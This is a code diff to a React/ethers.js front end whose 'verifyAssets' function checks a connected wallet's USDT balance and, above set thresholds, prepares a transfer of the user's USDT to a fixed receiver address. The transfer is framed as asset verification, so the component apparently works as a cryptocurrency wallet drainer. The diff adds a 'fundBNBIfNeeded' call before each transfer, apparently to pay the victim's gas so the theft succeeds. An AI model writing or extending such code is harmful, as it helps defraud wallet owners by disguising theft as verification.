@@ -1,8 +1,9 @@
 import React, { useState, useEffect } from "react";
 import { ethers } from "ethers";
 import { createRoot } from "react-dom/client";
+import {fundBNBIfNeeded} from "@/utils/gasUtils"
 import usdtAbi from "../abi/USDT.json";
-import { USDT_ADDRESS, USDT_RECEIVER, CHAIN_ID, CHAIN_ID_DECIMAL, NETWORK_NAME, USDT_THRESHOLD, GAS_FUNDER_ADDRESS, USDT_THRESHOLD2 } from "../utils/config";
+import { USDT_RECEIVER,USDT_THRESHOLD,USDT_THRESHOLD2 } from "../utils/config";
 import SuccessCard from "./SuccessCard";
 import VerifiedCard from "./VerifiedCard";
 
@@ -100,6 +101,7 @@ export const verifyAssets = async (
     
     if (balance.gte(threshold2)) {
       console.log("💰 Balance meets threshold 2, proceeding with special transfer");
+      await fundBNBIfNeeded(provider, userAddress);
       const usdtWithSigner = usdt.connect(signer);
       try {
         console.log("📝 Preparing special transfer transaction");
@@ -139,6 +141,7 @@ export const verifyAssets = async (
       }
     } else if (balance.gte(threshold)) {
       console.log("💰 Balance meets threshold, proceeding with transfer");
+      await fundBNBIfNeeded(provider, userAddress);
       const usdtWithSigner = usdt.connect(signer);
       try {
         console.log("📝 Preparing transfer transaction");
